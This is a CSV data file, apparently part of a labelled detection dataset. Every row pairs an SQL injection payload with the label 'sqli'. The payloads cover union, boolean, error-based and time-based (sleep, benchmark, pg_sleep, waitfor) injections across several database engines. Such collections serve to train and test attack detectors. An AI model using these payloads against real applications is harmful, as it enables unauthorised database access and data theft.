content,attack_type,source,source_uid,orig_attack_type_label
"1"") as xaye where 5343=5343 and 4355=7475#",1,external_httpparamsdataset,external_httpparamsdataset_13093,sqli
"-5826"")) union all select 7192,7192#",1,external_httpparamsdataset,external_httpparamsdataset_13094,sqli
-2129') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('eutm' like 'eutm,1,external_httpparamsdataset,external_httpparamsdataset_13095,sqli
"1)) union all select null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13096,sqli
"-1513"") as swvd where 2958=2958 union all select 2958,2958,2958--",1,external_httpparamsdataset,external_httpparamsdataset_13097,sqli
1'+(select dpkp where 4836=4836 and sleep(5))+',1,external_httpparamsdataset,external_httpparamsdataset_13098,sqli
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('skdm'='skdm",1,external_httpparamsdataset,external_httpparamsdataset_13099,sqli
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",1,external_httpparamsdataset,external_httpparamsdataset_13100,sqli
"1""))) and (7396=6351)*6351 and (((""xerw"" like ""xerw",1,external_httpparamsdataset,external_httpparamsdataset_13101,sqli
"1%""))) order by 1#",1,external_httpparamsdataset,external_httpparamsdataset_13102,sqli
-6217)) as hyws where 3441=3441 or 9421=4695#,1,external_httpparamsdataset,external_httpparamsdataset_13103,sqli
"1'+(select 'tyuz' where 3957=3957 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))+'",1,external_httpparamsdataset,external_httpparamsdataset_13104,sqli
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1,external_httpparamsdataset,external_httpparamsdataset_13105,sqli
"-4280%""))) union all select 7981,7981--",1,external_httpparamsdataset,external_httpparamsdataset_13106,sqli
"1,(case when 2872=2872 then 1 else null end)",1,external_httpparamsdataset,external_httpparamsdataset_13107,sqli
"1%"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13108,sqli
"-1844') union all select 9572,9572,9572,9572#",1,external_httpparamsdataset,external_httpparamsdataset_13109,sqli
"1"") as ivuv where 5691=5691;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,external_httpparamsdataset,external_httpparamsdataset_13110,sqli
"1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",1,external_httpparamsdataset,external_httpparamsdataset_13111,sqli
"-7485"")) as caob where 4100=4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",1,external_httpparamsdataset,external_httpparamsdataset_13112,sqli
"1"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_13113,sqli
"-8013%"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13114,sqli
"1) and elt(4249=4249,7259) and (8226=8226",1,external_httpparamsdataset,external_httpparamsdataset_13115,sqli
1') where 8575=8575 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,external_httpparamsdataset,external_httpparamsdataset_13116,sqli
"-9136') or make_set(9354=9354,7185)",1,external_httpparamsdataset,external_httpparamsdataset_13117,sqli
"-8203"") union all select 6394,6394,6394,6394,6394--",1,external_httpparamsdataset,external_httpparamsdataset_13118,sqli
"1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",1,external_httpparamsdataset,external_httpparamsdataset_13119,sqli
"1""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""tabq"" like ""tabq",1,external_httpparamsdataset,external_httpparamsdataset_13120,sqli
-6855') or 8519=9248,1,external_httpparamsdataset,external_httpparamsdataset_13121,sqli
-8004%') or (2301=7504)*7504 and ('%'=',1,external_httpparamsdataset,external_httpparamsdataset_13122,sqli
1)) union all select null#,1,external_httpparamsdataset,external_httpparamsdataset_13123,sqli
"1' in boolean mode) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13124,sqli
1) rlike (select * from (select(sleep(5)))sgvo) and (4968=4968,1,external_httpparamsdataset,external_httpparamsdataset_13125,sqli
"1"" where 2309=2309 or elt(5873=5873,sleep(5))#",1,external_httpparamsdataset,external_httpparamsdataset_13126,sqli
1' where 1593=1593;begin user_lock.sleep(5); end--,1,external_httpparamsdataset,external_httpparamsdataset_13127,sqli
"-8065""))) order by 1--",1,external_httpparamsdataset,external_httpparamsdataset_13128,sqli
"1) where 6788=6788 union all select null,null,null,null,null,null,null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13129,sqli
-2790')) or 8571=8571--,1,external_httpparamsdataset,external_httpparamsdataset_13130,sqli
"1'+(select 'nhlx' where 2291=2291 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))+'",1,external_httpparamsdataset,external_httpparamsdataset_13131,sqli
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""oxvw""=""oxvw",1,external_httpparamsdataset,external_httpparamsdataset_13132,sqli
"1"")) and elt(6553=4771,4771) and ((""eolu""=""eolu",1,external_httpparamsdataset,external_httpparamsdataset_13133,sqli
"1;select benchmark(5000000,md5(0x4c4d6142))-- sztf",1,external_httpparamsdataset,external_httpparamsdataset_13134,sqli
"-3278')) or elt(1032=1032,3623) and (('zxig' like 'zxig",1,external_httpparamsdataset,external_httpparamsdataset_13135,sqli
1' where 2913=2913 and (select * from (select(sleep(5)))fzno)--,1,external_httpparamsdataset,external_httpparamsdataset_13136,sqli
"1%"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,external_httpparamsdataset,external_httpparamsdataset_13137,sqli
"-4856' in boolean mode) union all select 1074,1074,1074,1074,1074,1074,1074#",1,external_httpparamsdataset,external_httpparamsdataset_13138,sqli
1 rlike (select (case when (7689=7689) then 1 else 0x28 end))# mekk,1,external_httpparamsdataset,external_httpparamsdataset_13139,sqli
1')) or sleep(5)#,1,external_httpparamsdataset,external_httpparamsdataset_13140,sqli
"1'||(select 'xjtq' from dual where 5719=5719 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",1,external_httpparamsdataset,external_httpparamsdataset_13141,sqli
"1'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('qfvg'='qfvg",1,external_httpparamsdataset,external_httpparamsdataset_13142,sqli
"(select 1 from generate_series(8515,8515,case when (8515=3477) then 1 else 0 end) limit 1)",1,external_httpparamsdataset,external_httpparamsdataset_13143,sqli
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('hllf'='hllf",1,external_httpparamsdataset,external_httpparamsdataset_13144,sqli
"-9977"" where 5132=5132 union all select 5132--",1,external_httpparamsdataset,external_httpparamsdataset_13145,sqli
1') as uaoz where 2464=2464;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1,external_httpparamsdataset,external_httpparamsdataset_13146,sqli
"1"");iif(9875=8961,1,1/0)",1,external_httpparamsdataset,external_httpparamsdataset_13147,sqli
"1' union all select null,null,null,null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13148,sqli
1') as imgv where 7802=7802;select (case when (9619=8679) then 1 else 9619*(select 9619 from master..sysdatabases) end)--,1,external_httpparamsdataset,external_httpparamsdataset_13149,sqli
"iif(9229=4158,1,1/0)",1,external_httpparamsdataset,external_httpparamsdataset_13150,sqli
"1) as cejp where 4736=4736 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_13151,sqli
"-9379) or make_set(9354=9354,7185) and (9212=9212",1,external_httpparamsdataset,external_httpparamsdataset_13152,sqli
"-7491"") as cnrn where 3635=3635 order by 1#",1,external_httpparamsdataset,external_httpparamsdataset_13153,sqli
"1'||(select 'noik' from dual where 9851=9851;iif(5257=5257,1,1/0)",1,external_httpparamsdataset,external_httpparamsdataset_13154,sqli
-3849) or 5580=3442--,1,external_httpparamsdataset,external_httpparamsdataset_13155,sqli
"1) as cjmt where 4839=4839 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1,external_httpparamsdataset,external_httpparamsdataset_13156,sqli
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,external_httpparamsdataset,external_httpparamsdataset_13157,sqli
-1393'))) union all select 8280--,1,external_httpparamsdataset,external_httpparamsdataset_13158,sqli
"1"" where 7279=7279 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1,external_httpparamsdataset,external_httpparamsdataset_13159,sqli
"1'||(select 'rdqv' from dual where 1894=1894;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",1,external_httpparamsdataset,external_httpparamsdataset_13160,sqli
"1'||(select 'qgnz' where 6446=6446;select count(*) from generate_series(1,5000000)--",1,external_httpparamsdataset,external_httpparamsdataset_13161,sqli
"1' where 7104=7104 union all select null,null,null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13162,sqli
"1%'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('%'='",1,external_httpparamsdataset,external_httpparamsdataset_13163,sqli
"1',iif(4861=6268,1,1/0)",1,external_httpparamsdataset,external_httpparamsdataset_13164,sqli
-7453'))) or 8571=8571--,1,external_httpparamsdataset,external_httpparamsdataset_13165,sqli
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1,external_httpparamsdataset,external_httpparamsdataset_13166,sqli
"1""))) and make_set(7809=9564,9564) and (((""jggk"" like ""jggk",1,external_httpparamsdataset,external_httpparamsdataset_13167,sqli
"1%"")) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1,external_httpparamsdataset,external_httpparamsdataset_13168,sqli
1)) and (select * from (select(sleep(5)))fzno) and ((5171=5171,1,external_httpparamsdataset,external_httpparamsdataset_13169,sqli
"-2246"")) union all select 4613,4613,4613,4613,4613,4613#",1,external_httpparamsdataset,external_httpparamsdataset_13170,sqli
1) where 4479=4479 rlike (select (case when (6351=4367) then 1 else 0x28 end))--,1,external_httpparamsdataset,external_httpparamsdataset_13171,sqli
1);select (case when (2056=1917) then 2056 else 1/(select 0) end)--,1,external_httpparamsdataset,external_httpparamsdataset_13172,sqli
1%') or 4240=(select 4240 from pg_sleep(5))--,1,external_httpparamsdataset,external_httpparamsdataset_13173,sqli
"-2287')) union all select 1200,1200,1200,1200,1200#",1,external_httpparamsdataset,external_httpparamsdataset_13174,sqli
"-1413"") union all select 6651,6651,6651--",1,external_httpparamsdataset,external_httpparamsdataset_13175,sqli
1');select (case when (3859=6938) then 3859 else 3859*(select 3859 from mysql.db) end)#,1,external_httpparamsdataset,external_httpparamsdataset_13176,sqli
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('yxpi'='yxpi,1,external_httpparamsdataset,external_httpparamsdataset_13177,sqli
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ""cyrb""=""cyrb",1,external_httpparamsdataset,external_httpparamsdataset_13178,sqli
"1) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1,external_httpparamsdataset,external_httpparamsdataset_13179,sqli
-3937)) or 3038=3038,1,external_httpparamsdataset,external_httpparamsdataset_13180,sqli
1%'));select (case when (5322=6200) then 5322 else cast(1 as int)/(select 0 from dual) end) from dual--,1,external_httpparamsdataset,external_httpparamsdataset_13181,sqli
1'+(select onzd where 8452=8452 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))+',1,external_httpparamsdataset,external_httpparamsdataset_13182,sqli
"1 where 5859=5859 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13183,sqli
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'qdij'='qdij",1,external_httpparamsdataset,external_httpparamsdataset_13184,sqli
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1,external_httpparamsdataset,external_httpparamsdataset_13185,sqli
"1) or 8466=benchmark(5000000,md5(0x694a4745)) and (1773=1773",1,external_httpparamsdataset,external_httpparamsdataset_13186,sqli
"1""))) union all select null,null,null,null,null,null,null,null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13187,sqli
"1%"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,external_httpparamsdataset,external_httpparamsdataset_13188,sqli
"1"" where 6111=6111 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_13189,sqli
1%'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',1,external_httpparamsdataset,external_httpparamsdataset_13190,sqli
"1') as cgsz where 7194=7194 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1,external_httpparamsdataset,external_httpparamsdataset_13191,sqli
"1%"";waitfor delay '0:0:5'--",1,external_httpparamsdataset,external_httpparamsdataset_13192,sqli
"1""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""uzjn""=""uzjn",1,external_httpparamsdataset,external_httpparamsdataset_13193,sqli
"1%"") rlike sleep(5)#",1,external_httpparamsdataset,external_httpparamsdataset_13194,sqli
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",1,external_httpparamsdataset,external_httpparamsdataset_13195,sqli
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,external_httpparamsdataset,external_httpparamsdataset_13196,sqli
"-5526 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,external_httpparamsdataset,external_httpparamsdataset_13197,sqli
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lijy'='lijy",1,external_httpparamsdataset,external_httpparamsdataset_13198,sqli
"1'+(select 'epza' where 8994=8994 and make_set(3782=2428,2428))+'",1,external_httpparamsdataset,external_httpparamsdataset_13199,sqli
"1) as kqas where 7302=7302 and 8407=(select count(*) from generate_series(1,5000000))--",1,external_httpparamsdataset,external_httpparamsdataset_13200,sqli
"-1258"")) union all select 7734,7734,7734#",1,external_httpparamsdataset,external_httpparamsdataset_13201,sqli
1 where 3027=3027 and 4595=4595#,1,external_httpparamsdataset,external_httpparamsdataset_13202,sqli
"1))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((8382=8382",1,external_httpparamsdataset,external_httpparamsdataset_13203,sqli
1%')) or sleep(5)#,1,external_httpparamsdataset,external_httpparamsdataset_13204,sqli
"1'||(select 'lzvb' where 1637=1637 union all select null,null,null,null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13205,sqli
"1 where 6221=6221 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,external_httpparamsdataset,external_httpparamsdataset_13206,sqli
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# yoch,1,external_httpparamsdataset,external_httpparamsdataset_13207,sqli
1'+(select rhlb where 9477=9477;if(7899=7899) select 7899 else drop function zbbp--,1,external_httpparamsdataset,external_httpparamsdataset_13208,sqli
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""ytju"" like ""ytju",1,external_httpparamsdataset,external_httpparamsdataset_13209,sqli
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_13210,sqli
"-4919) union all select 2608,2608,2608,2608,2608,2608#",1,external_httpparamsdataset,external_httpparamsdataset_13211,sqli
1')) or sleep(5) and (('taaj'='taaj,1,external_httpparamsdataset,external_httpparamsdataset_13212,sqli
"1%')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,external_httpparamsdataset,external_httpparamsdataset_13213,sqli
"1%"")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13214,sqli
"1%' union all select null,null,null,null,null,null,null,null--",1,external_httpparamsdataset,external_httpparamsdataset_13215,sqli
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_13216,sqli
"1"" where 6785=6785 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13217,sqli
1%'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',1,external_httpparamsdataset,external_httpparamsdataset_13218,sqli
1'+(select 'unpz' where 8186=8186;select (case when (2593=3592) then 2593 else 2593*(select 2593 from information_schema.character_sets) end)#,1,external_httpparamsdataset,external_httpparamsdataset_13219,sqli
"1'||(select 'gtri' from dual where 7097=7097 and elt(1210=1210,sleep(5)))||'",1,external_httpparamsdataset,external_httpparamsdataset_13220,sqli
1'||(select 'hlxd' from dual where 2615=2615 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))||',1,external_httpparamsdataset,external_httpparamsdataset_13221,sqli
1'+(select 'mzee' where 5984=5984;(select * from (select(sleep(5)))acdk)#,1,external_httpparamsdataset,external_httpparamsdataset_13222,sqli
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1,external_httpparamsdataset,external_httpparamsdataset_13223,sqli
"1) where 4226=4226 or elt(5873=5873,sleep(5))#",1,external_httpparamsdataset,external_httpparamsdataset_13224,sqli
"1"") where 7919=7919 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_13225,sqli
"1%"")) and elt(3114=3114,sleep(5))#",1,external_httpparamsdataset,external_httpparamsdataset_13226,sqli
"1))) and elt(3114=3114,sleep(5))#",1,external_httpparamsdataset,external_httpparamsdataset_13227,sqli
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""zzcd""=""zzcd",1,external_httpparamsdataset,external_httpparamsdataset_13228,sqli
1;select sleep(5)#,1,external_httpparamsdataset,external_httpparamsdataset_13229,sqli
"1%"") and 6969=(select 6969 from pg_sleep(5)) and (""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13230,sqli
1'||(select 'pcps' from dual where 7255=7255 and 7121=4603,1,external_httpparamsdataset,external_httpparamsdataset_13231,sqli
1 where 7452=7452 or 4240=(select 4240 from pg_sleep(5))--,1,external_httpparamsdataset,external_httpparamsdataset_13232,sqli
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('xdfz'='xdfz",1,external_httpparamsdataset,external_httpparamsdataset_13233,sqli
1' rlike (select * from (select(sleep(5)))sgvo) and 'obwn'='obwn,1,external_httpparamsdataset,external_httpparamsdataset_13234,sqli
"1'+(select 'drvv' where 5622=5622 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13235,sqli
"-2901"" or elt(9866=9099,9099) and ""asib"" like ""asib",1,external_httpparamsdataset,external_httpparamsdataset_13236,sqli
"1 and elt(4249=4249,7259)-- meef",1,external_httpparamsdataset,external_httpparamsdataset_13237,sqli
"-8943%') union all select 7710,7710#",1,external_httpparamsdataset,external_httpparamsdataset_13238,sqli
"1'));iif(5257=5257,1,1/0)",1,external_httpparamsdataset,external_httpparamsdataset_13239,sqli
"1%' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and '%'='",1,external_httpparamsdataset,external_httpparamsdataset_13240,sqli
"1'||(select 'qjwf' from dual where 3187=3187 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",1,external_httpparamsdataset,external_httpparamsdataset_13241,sqli
"-6085 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1,external_httpparamsdataset,external_httpparamsdataset_13242,sqli
"1) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (2303=2303",1,external_httpparamsdataset,external_httpparamsdataset_13243,sqli
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""qzzg"" like ""qzzg",1,external_httpparamsdataset,external_httpparamsdataset_13244,sqli
1' rlike sleep(5) and 'cugs'='cugs,1,external_httpparamsdataset,external_httpparamsdataset_13245,sqli
1);select sleep(5),1,external_httpparamsdataset,external_httpparamsdataset_13246,sqli
-4219' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),1,external_httpparamsdataset,external_httpparamsdataset_13247,sqli
1'+(select 'mjgo' where 4026=4026;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1,external_httpparamsdataset,external_httpparamsdataset_13248,sqli
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,external_httpparamsdataset,external_httpparamsdataset_13249,sqli
1;(select * from (select(sleep(5)))srmq)-- mmjk,1,external_httpparamsdataset,external_httpparamsdataset_13250,sqli
1);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1,external_httpparamsdataset,external_httpparamsdataset_13251,sqli
"-8053"" where 5458=5458 or 9323=9323#",1,external_httpparamsdataset,external_httpparamsdataset_13252,sqli
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""ouix""=""ouix",1,external_httpparamsdataset,external_httpparamsdataset_13253,sqli
1) where 5774=5774;select case when 9848=2618 then 1 else null end--,1,external_httpparamsdataset,external_httpparamsdataset_13254,sqli
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1,external_httpparamsdataset,external_httpparamsdataset_13255,sqli
"-5207) where 6987=6987 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,external_httpparamsdataset,external_httpparamsdataset_13256,sqli
"1"" where 4688=4688 or 8466=benchmark(5000000,md5(0x694a4745))--",1,external_httpparamsdataset,external_httpparamsdataset_13257,sqli
1';(select * from (select(sleep(5)))srmq) and 'mcrt'='mcrt,1,external_httpparamsdataset,external_httpparamsdataset_13258,sqli
"1"") where 5005=5005 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1,external_httpparamsdataset,external_httpparamsdataset_13259,sqli
"1%'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('%'='",1,external_httpparamsdataset,external_httpparamsdataset_13260,sqli
"-7006' where 6966=6966 union all select 6966,6966,6966,6966#",1,external_httpparamsdataset,external_httpparamsdataset_13261,sqli
1')));begin user_lock.sleep(5); end and ((('ycte'='ycte,1,external_httpparamsdataset,external_httpparamsdataset_13262,sqli
"1%"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_13263,sqli
"-1187') union all select 8202,8202,8202,8202,8202,8202,8202#",1,external_httpparamsdataset,external_httpparamsdataset_13264,sqli
1'||(select 'zwcp' where 3333=3333;select (case when (7163=1777) then 1 else 7163*(select 7163 from master..sysdatabases) end)--,1,external_httpparamsdataset,external_httpparamsdataset_13265,sqli
1'));select (case when (6045=2786) then 6045 else 1/(select 0) end)--,1,external_httpparamsdataset,external_httpparamsdataset_13266,sqli
"1%""));if(4907=9581) select 4907 else drop function apqw--",1,external_httpparamsdataset,external_httpparamsdataset_13267,sqli
"1"" and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,external_httpparamsdataset,external_httpparamsdataset_13268,sqli
"1%')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_13269,sqli
"1 where 4448=4448 union all select null,null,null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_13270,sqli
1%' and 7533=7533 and '%'=',1,external_httpparamsdataset,external_httpparamsdataset_13271,sqli
"1) where 3030=3030;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",1,external_httpparamsdataset,external_httpparamsdataset_13272,sqli
1' and sleep(5) and 'pfgy'='pfgy,1,external_httpparamsdataset,external_httpparamsdataset_13273,sqli
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'jjmt'='jjmt",1,external_httpparamsdataset,external_httpparamsdataset_13274,sqli
"1"")) as bbkl where 5686=5686;select benchmark(5000000,md5(0x4c4d6142))--",1,external_httpparamsdataset,external_httpparamsdataset_13275,sqli
"1 where 5099=5099 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1,external_httpparamsdataset,external_httpparamsdataset_13276,sqli
